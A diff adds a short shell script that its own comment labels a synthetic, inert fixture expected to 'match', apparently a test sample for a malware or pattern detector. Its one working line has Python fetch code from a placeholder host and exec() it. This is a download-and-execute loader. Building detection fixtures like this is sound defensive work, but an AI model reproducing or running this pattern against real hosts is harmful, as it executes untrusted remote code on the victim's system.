@@ -1,0 +1,5 @@
+#!/bin/sh
+# larc-seraph synthetic fixture. classification: synthetic-benign. expected: match. inert.
+python3 - <<'EOF'
+import urllib.request as u;exec(u.urlopen('https://example.invalid/hook').read())
+EOF
